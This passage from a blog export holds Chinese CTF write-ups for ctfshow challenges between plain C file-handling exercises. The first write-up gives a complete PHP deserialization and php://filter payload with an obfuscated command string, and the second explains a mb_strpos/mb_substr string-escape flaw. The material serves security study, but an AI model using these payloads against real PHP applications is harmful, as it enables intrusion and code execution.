<h2 id="使用字符编码转换-base64-decode消除字符"><a href="#使用字符编码转换-base64-decode消除字符" class="headerlink" title="使用字符编码转换+base64-decode消除字符"></a>使用字符编码转换+base64-decode消除字符</h2><p>我们都知道php中base64_decode会将非码表字符进行消除。那么我们先将垃圾字符变为非码表字符在解码不就能一次消除了吗<br>相信在我们进行字符集的编码转换时经常出现原本是英文但是转个编码就成了中文。原理就差不多是这个<br>我们先来看下面的代码<br><img src="/2024/09/05/ctfshow-%E5%85%83%E6%97%A6%E6%9D%AF%E5%88%B7%E9%A2%98/32.png" class="" title="alt text"><br>我们会发现其都变为了中文字符。这是英文在utf-8转为utf-16时会在每个字母后加一个不可见字符，如果没有这个不可见字符就会被编码为奇怪的中文。<br>那么我们将我们想写入的字符串转为utf-16在利用伪协议转为utf-8那么这时我们写入的字符是正常的但是垃圾字符却变成了中文，在使用base64解码就会消除垃圾字符<br><img src="/2024/09/05/ctfshow-%E5%85%83%E6%97%A6%E6%9D%AF%E5%88%B7%E9%A2%98/33.png" class="" title="alt text"><br>可以发现成功消除垃圾字符。<br>另外因为file_put_content不能直接处理空字符即我们还需要一部编码，这里我们使用quoted_printable_encode($c);来编码。<br>代码如下<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;urldecode&quot;</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">mb_convert_encoding</span>(<span class="variable">$c</span>,<span class="string">&quot;utf-16le&quot;</span>,<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;ctfshowshowshowwww&quot;</span>.<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$f</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">mb_convert_encoding</span>(<span class="variable">$a</span>,<span class="string">&quot;utf-8&quot;</span>,<span class="string">&quot;utf-16le&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$f</span>\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">quoted_printable_encode</span>(<span class="variable">$c</span>);</span><br></pre></td></tr></table></figure><br>payload如下<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?%73%68%6f%77[%73%68%6f%77.%73%68%6f%77=C:11:%22ArrayObject%22:186:&#123;x:i:0;a:1:&#123;i:1;O:3:%22ctf%22:2:&#123;s:2:%22h1%22;O:4:%22%73%68%6f%77%22:0:&#123;&#125;s:2:%22h2%22;a:1:&#123;i:0;a:3:&#123;i:0;s:0:%22%22;i:1;s:0:%22%22;i:2;O:10:%22Chu0_write%22:3:&#123;s:4:%22chu0%22;s:1:%221%22;s:4:%22chu1%22;s:1:%221%22;s:3:%22cmd%22;N;&#125;&#125;&#125;&#125;&#125;;m:a:0:&#123;&#125;&#125;&amp;chu0=d=00X=00J=00s=00Z=00G=00V=00j=00b=002=00R=00l=00&amp;name=php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=ctfw&amp;cmd=$_=(~%9E%8C%8C%9A%8D%8B);$__=(~%8C%86%8C%8B%9A%92%D7%DD%9C%9E%8B%DF%D0%99%93%9E%98%DD%D6%C4);$_($__);</span><br><span class="line"></span><br><span class="line">POST</span><br><span class="line">chu0=1&amp;name=1&amp;show%5Bshow.show=1&amp;cmd=1</span><br></pre></td></tr></table></figure><br><img src="/2024/09/05/ctfshow-%E5%85%83%E6%97%A6%E6%9D%AF%E5%88%B7%E9%A2%98/34.png" class="" title="alt text"></p>
]]></content>
      <categories>
        <category>wp</category>
        <category>比赛wp(复现)</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>c语言</title>
    <url>/2023/12/29/c%E8%AF%AD%E8%A8%80/</url>
    <content><![CDATA[<h1 id="8-1"><a href="#8-1" class="headerlink" title="8-1"></a>8-1</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">char</span> ch;</span><br><span class="line">	FILE *i, *fp;</span><br><span class="line">	i = fopen(<span class="string">&quot;d:\\data\\sy8-1-out.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">	ch = getchar();</span><br><span class="line">	<span class="keyword">while</span> (ch != <span class="string">&#x27;#&#x27;</span>) &#123;</span><br><span class="line">		fputc(ch, i);</span><br><span class="line">		ch = getchar();</span><br><span class="line">	&#125;</span><br><span class="line">	fclose(i);</span><br><span class="line">	i = fopen(<span class="string">&quot;d:\\data\\sy8-1-out.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">	fp = fopen(<span class="string">&quot;d:\\data\\sy8-1-out1.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">		ch = fgetc(i);</span><br><span class="line">		<span class="keyword">if</span> (feof(i))</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">if</span> (ch &lt;= <span class="string">&#x27;z&#x27;</span> &amp;&amp; ch &gt;= <span class="string">&#x27;a&#x27;</span>) &#123;</span><br><span class="line">			ch -= <span class="number">32</span>;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, ch);</span><br><span class="line">			fputc(ch, fp);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	fclose(fp);</span><br><span class="line">	fclose(i);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="8-2"><a href="#8-2" class="headerlink" title="8-2"></a>8-2</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">char</span> str[<span class="number">100</span>];</span><br><span class="line">	<span class="type">int</span> i = <span class="number">0</span>, n = <span class="number">10</span>, t, j, s = <span class="number">0</span>, arr[<span class="number">10</span>];</span><br><span class="line">	<span class="type">float</span> f;</span><br><span class="line">	FILE *fp1, *fp2;</span><br><span class="line">	fp1 = fopen(<span class="string">&quot;d:\\data\\sy8-2-in.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">	fp2 = fopen(<span class="string">&quot;d:\\data\\sy8-2-out.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">		<span class="built_in">fscanf</span>(fp1, <span class="string">&quot;%d&quot;</span>, &amp;arr[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">		<span class="keyword">for</span> (j = i + <span class="number">1</span>; j &lt; n; j++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (arr[i] &gt; arr[j]) &#123;</span><br><span class="line">				t = arr[i];</span><br><span class="line">				arr[i] = arr[j];</span><br><span class="line">				arr[j] = t;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; n - <span class="number">1</span>; i++) &#123;</span><br><span class="line">		s += arr[i];</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[i]);</span><br><span class="line">		<span class="built_in">fprintf</span>(fp2, <span class="string">&quot;%d&quot;</span>, arr[i]);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	f = (<span class="type">float</span>)s / <span class="number">8</span>;</span><br><span class="line">	<span class="built_in">fprintf</span>(fp2, <span class="string">&quot;\n%.2f&quot;</span>, f);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n%.2f&quot;</span>, f);</span><br><span class="line">	fclose(fp1);</span><br><span class="line">	fclose(fp2);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="8-3"><a href="#8-3" class="headerlink" title="8-3"></a>8-3</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> &#123;</span></span><br><span class="line">	<span class="type">char</span> num[<span class="number">11</span>];</span><br><span class="line">	<span class="type">char</span> name[<span class="number">11</span>];</span><br><span class="line">	<span class="type">float</span> c[<span class="number">3</span>];</span><br><span class="line">	<span class="type">float</span> j;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">input_data</span><span class="params">(<span class="keyword">struct</span> student stu[], <span class="type">int</span> n)</span> &#123;</span><br><span class="line">	<span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="type">float</span> s = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (; i &lt; n; i++) &#123;</span><br><span class="line">		s = <span class="number">0</span>;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s%s%f%f%f&quot;</span>, &amp;stu[i].num, &amp;stu[i].name, &amp;stu[i].c[<span class="number">0</span>], &amp;stu[i].c[<span class="number">1</span>], &amp;stu[i].c[<span class="number">2</span>]);</span><br><span class="line">		s += stu[i].c[<span class="number">0</span>] + stu[i].c[<span class="number">1</span>] + stu[i].c[<span class="number">2</span>];</span><br><span class="line">		stu[i].j = s / <span class="number">3</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sort</span><span class="params">(<span class="keyword">struct</span> student stu[], <span class="type">int</span> n)</span> &#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">student</span> <span class="title">t</span>;</span></span><br><span class="line">	<span class="type">int</span> i, j;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">		<span class="keyword">for</span> (j = i + <span class="number">1</span>; j &lt; n; j++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (stu[i].j &gt; stu[j].j) &#123;</span><br><span class="line">				t = stu[j];</span><br><span class="line">				stu[j] = stu[i];</span><br><span class="line">				stu[i] = t;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save</span><span class="params">(<span class="keyword">struct</span> student stu[], <span class="type">int</span> n, <span class="type">char</span> filename[])</span> &#123;</span><br><span class="line">	<span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">	FILE *fp;</span><br><span class="line">	fp = fopen(filename, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">		fwrite(&amp;stu[i], <span class="keyword">sizeof</span>(<span class="keyword">struct</span> student), <span class="number">1</span>, fp);</span><br><span class="line">	fclose(fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">read</span><span class="params">(<span class="keyword">struct</span> student stu[], <span class="type">char</span> filename[])</span> &#123;</span><br><span class="line">	<span class="type">int</span> n = <span class="number">0</span>, i = <span class="number">0</span>;</span><br><span class="line">	FILE *fp = fopen(filename, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">	<span class="keyword">while</span> (fread(&amp;stu[n], <span class="keyword">sizeof</span>(<span class="keyword">struct</span> student), <span class="number">1</span>, fp) == <span class="number">1</span>) &#123;</span><br><span class="line">		n++;</span><br><span class="line">	&#125;</span><br><span class="line">	fclose(fp);</span><br><span class="line">	<span class="keyword">return</span> n ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">insert</span><span class="params">(<span class="keyword">struct</span> student stu[], <span class="type">int</span> n, <span class="keyword">struct</span> student x)</span> &#123;</span><br><span class="line">	<span class="type">int</span> i = n - <span class="number">1</span>;</span><br><span class="line">	x.j = (x.c[<span class="number">0</span>] + x.c[<span class="number">1</span>] + x.c[<span class="number">2</span>]) / <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (i &gt;= <span class="number">0</span> &amp;&amp; x.j &lt; stu[i].j) &#123;</span><br><span class="line">		stu[i + <span class="number">1</span>] = stu[i];</span><br><span class="line">		i--;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	stu[i + <span class="number">1</span>] = x;</span><br><span class="line">	<span class="keyword">return</span> n + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_data</span><span class="params">(<span class="keyword">struct</span> student stu[], <span class="type">int</span> n)</span> &#123;</span><br><span class="line">	<span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (; i &lt; n; i++) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%s %s %.2f %.2f %.2f %.2f\n&quot;</span>, stu[i].num, stu[i].name, stu[i].c[<span class="number">0</span>], stu[i].c[<span class="number">1</span>], stu[i].c[<span class="number">2</span>], stu[i].j);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">student</span> <span class="title">stu</span>[100];</span></span><br><span class="line">	input_data(stu, n);</span><br><span class="line">	sort(stu, n);</span><br><span class="line">	save(stu, n, <span class="string">&quot;d:\\data\\sy8-3-in.txt&quot;</span>);</span><br><span class="line">	print_data(stu, n);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">student</span> <span class="title">x</span>;</span></span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%s%s%f%f%f&quot;</span>, &amp;x.num, &amp;x.name, &amp;x.c[<span class="number">0</span>], &amp;x.c[<span class="number">1</span>], &amp;x.c[<span class="number">2</span>]);</span><br><span class="line">	n = insert(stu, n, x);</span><br><span class="line">	save(stu, n, <span class="string">&quot;d:\\data\\sy8-3-out.txt&quot;</span>);</span><br><span class="line">	n = read(stu, <span class="string">&quot;d:\\data\\sy8-3-out.txt&quot;</span>);</span><br><span class="line">	print_data(stu, n);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, n);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="8-4"><a href="#8-4" class="headerlink" title="8-4"></a>8-4</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> &#123;</span></span><br><span class="line">	<span class="type">char</span> num[<span class="number">11</span>];</span><br><span class="line">	<span class="type">char</span> name[<span class="number">11</span>];</span><br><span class="line">	<span class="type">float</span> c[<span class="number">3</span>];</span><br><span class="line">	<span class="type">float</span> j;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> &#123;</span></span><br><span class="line">	<span class="type">char</span> num[<span class="number">11</span>];</span><br><span class="line">	<span class="type">char</span> name[<span class="number">11</span>];</span><br><span class="line">	<span class="type">float</span> c[<span class="number">3</span>];</span><br><span class="line">	<span class="type">float</span> j;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> node *<span class="title function_">create</span><span class="params">(<span class="type">char</span> filename[])</span> &#123;</span><br><span class="line">	<span class="type">int</span> i = <span class="number">0</span>, n = <span class="number">3</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">h</span>, *<span class="title">p</span>, *<span class="title">q</span>;</span></span><br><span class="line">	h = (<span class="keyword">struct</span> node *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> node));</span><br><span class="line">	h-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">student</span> <span class="title">t</span>;</span></span><br><span class="line">	FILE *fp = fopen(filename, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (; fread(&amp;t, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> student), <span class="number">1</span>, fp) == <span class="number">1</span>;) &#123;</span><br><span class="line">		p = (<span class="keyword">struct</span> node *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> node));</span><br><span class="line">		<span class="built_in">strcpy</span>(p-&gt;num, t.num);</span><br><span class="line">		<span class="built_in">strcpy</span>(p-&gt;name, t.name);</span><br><span class="line">		<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">			p-&gt;c[i] = t.c[i];</span><br><span class="line">		p-&gt;j = t.j;</span><br><span class="line">		p-&gt;next = h-&gt;next;</span><br><span class="line">		h-&gt;next = p;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">(<span class="keyword">struct</span> node *h)</span> &#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">p</span>;</span></span><br><span class="line">	p = h-&gt;next;</span><br><span class="line">	<span class="keyword">while</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%s %s %f %f %f %f\n&quot;</span>, p-&gt;num, p-&gt;name, p-&gt;c[<span class="number">0</span>], p-&gt;c[<span class="number">1</span>], p-&gt;c[<span class="number">2</span>], p-&gt;j);</span><br><span class="line">		p = p-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">h</span>;</span></span><br><span class="line">	h = create(<span class="string">&quot;d:\\data\\sy8-3-out.txt&quot;</span>);</span><br><span class="line">	print(h);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>ctfshow西瓜杯wp</title>
    <url>/2024/07/09/ctfshow%E8%A5%BF%E7%93%9C%E6%9D%AFwp/</url>
    <content><![CDATA[<h1 id="暑假还是有点犯懒了，哎意料之中，上周ctfshow西瓜杯的题目我看了一些，感觉还是很有价值的所有复现一下。"><a href="#暑假还是有点犯懒了，哎意料之中，上周ctfshow西瓜杯的题目我看了一些，感觉还是很有价值的所有复现一下。" class="headerlink" title="暑假还是有点犯懒了，哎意料之中，上周ctfshow西瓜杯的题目我看了一些，感觉还是很有价值的所有复现一下。"></a>暑假还是有点犯懒了，哎意料之中，上周ctfshow西瓜杯的题目我看了一些，感觉还是很有价值的所有复现一下。</h1><h1 id="CodeInject"><a href="#CodeInject" class="headerlink" title="CodeInject"></a>CodeInject</h1><p>简单闭合一下前面的就可以命令执行了<br><img src="/2024/07/09/ctfshow%E8%A5%BF%E7%93%9C%E6%9D%AFwp/1.png" class="" title="alt text">\</p>
<h1 id="easy-polluted"><a href="#easy-polluted" class="headerlink" title="easy_polluted"></a>easy_polluted</h1><p>和ciscn线下的python污染就不多说了</p>
<h1 id="Ezzz-php"><a href="#Ezzz-php" class="headerlink" title="Ezzz_php"></a>Ezzz_php</h1><p>这题做道了一半但是因为我是最后一天下午才打的这个比赛导致我最后虽然查道了如何将file_get_contents升级为命令执行的文章但是还是没有写出来</p>
<h2 id="反序列链"><a href="#反序列链" class="headerlink" title="反序列链"></a>反序列链</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">substrstr</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$start</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;[&quot;</span>);</span><br><span class="line">    <span class="variable">$end</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;]&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">mb_substr</span>(<span class="variable">$data</span>, <span class="variable">$start</span> + <span class="number">1</span>, <span class="variable">$end</span> - <span class="number">1</span> - <span class="variable">$start</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">read_file</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$start</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;start=<span class="variable">$start</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;start == <span class="string">&quot;gxngxngxn&quot;</span>)&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&#x27;What you are reading is:&#x27;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;start&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$readfile</span> = <span class="keyword">new</span> <span class="title function_ invoke__">read_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;start&#x27;</span>]);</span><br><span class="line">    <span class="variable">$read</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;read&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;read&#x27;</span>]:<span class="string">&quot;I_want_to_Read_flag&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\[|\]/i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;read&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NONONO!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$ctf</span> = <span class="title function_ invoke__">substrstr</span>(<span class="variable">$read</span>.<span class="string">&quot;[&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="variable">$readfile</span>).<span class="string">&quot;]&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$ctf</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Start_Funny_CTF!!!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先审计源码我们可以发现其存在反序列入口，但是反序列的<code>$ctf</code>通过substrstr这个函数处理导致其反序列的内容于前面拼接的<code>read</code>无关这是很矛盾的，所有我们查看一下这个substrstr函数<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">substrstr</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$start</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;[&quot;</span>);</span><br><span class="line">    <span class="variable">$end</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;]&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">mb_substr</span>(<span class="variable">$data</span>, <span class="variable">$start</span> + <span class="number">1</span>, <span class="variable">$end</span> - <span class="number">1</span> - <span class="variable">$start</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>可以发现其是使用mb_strpos和mb_substr这两个函数我们先了解一下这个两个函数<br>php的内置函数像上strlen substr这样的字符处理函数其是会因为不同的编码而返回不同的值的，这是因为其处理字符是在字节层次进行的，而如果我们要使得汉字在不同的编码下处理的结果不会出现差异从而导致各种各样的问题，我们就需要使用mbstring这个扩展了。</p>
<p>但是其mb_strpos和mb_substr在处理像<code>\xF0 \x9f</code>这种utf-8的字符会存在一些差异这也就导致了，字符串逃逸的风险<br>像题目中的substrstr函数其就使用了mb_strpos和mb_substr来截取<code>[]</code>内的字符。<br>我们先来说一下其在处时存在什么样的差异<br>这个我是看来p牛的文章才知道的。如下例子<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">substrstr</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$start</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;[&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$start</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="variable">$end</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;]&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$end</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">mb_substr</span>(<span class="variable">$data</span>, <span class="variable">$start</span> + <span class="number">1</span>, <span class="variable">$end</span> - <span class="number">1</span> - <span class="variable">$start</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$read</span>=<span class="string">&quot;\xF0\x9F[aaa123]&quot;</span>;</span><br><span class="line"><span class="variable">$data</span>=<span class="title function_ invoke__">substrstr</span>(<span class="variable">$read</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$data</span>;</span><br></pre></td></tr></table></figure><br>其输出为<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1</span><br><span class="line">8</span><br><span class="line">a123]</span><br></pre></td></tr></table></figure><br>我们可以看到虽然我们输出的<code>$start</code>和<code>$end</code>为1和8但是其并没有将键值为2到7的内容输出，这就是因为mb_subpos和mb_substr这两个函数的在处理含有utf-8字符时的区别<br>根据如上的结果我们可以发现，mb_strpos在处理<code>\xF0\x9F[</code>这种utf-8后跟着正常字符时会直接截断将已经解析的<code>\xF0\x9F</code>解析为一个字符。<br>我们都知道utf-8的一个字符是有四个字节的16进制字符组成的，而mb_substr其在处理字符时为<code>\xF0\x9F</code>是如果后面跟着非utf-8编码的字符是就和将后两个字节合并到前面的<code>\xF0\x9F</code>使其与正常的utf-8是同一大学而后在正常解析。这导致了mb_strpos会将<code>\xF0\x9F[a</code>解析为三个字符而mb_substr会将其解析为一个字符这也就导致了其字符会减少两个。这也就会导致字符串的逃逸。</p>
<p>经过尝试我们发现了只要不断增加<code>\xF0\x9F</code>的数量即可逃逸，每个<code>\xF0\x9F\xF0\x9F</code>会被mb_strpos解析为两个字符而<code>\xF0\x9F\xF0\x9F</code>只会被mb_substr解析为一个字符这会导致字符串减少的字符串逃逸。</p>
